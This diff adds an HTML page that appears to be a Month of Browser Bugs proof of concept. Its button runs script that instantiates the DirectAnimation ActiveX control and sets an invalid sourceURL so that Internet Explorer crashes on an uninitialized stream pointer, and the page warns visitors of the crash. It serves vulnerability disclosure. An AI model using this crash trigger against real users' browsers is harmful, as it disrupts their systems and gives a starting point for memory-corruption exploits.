@@ -1,0 +1,16 @@
+&lt;html&gt;&lt;body&gt;&lt;script&gt;
+
+// MoBB Demonstration
+function Demo() {
+        var a = new ActiveXObject(&#039;DirectAnimation.StructuredGraphicsControl&#039;);
+        a.sourceURL = &#039;CrashingBecauseStreamPtrNotInitialized&#039;;
+}
+
+&lt;/script&gt;
+
+Clicking the button below may crash your browser!&lt;br&gt;&lt;br&gt;
+&lt;input type=&#039;button&#039; onClick=&#039;Demo()&#039; value=&#039;Start Demo!&#039;&gt;
+
+
+&lt;/body&gt;&lt;/html&gt;
+
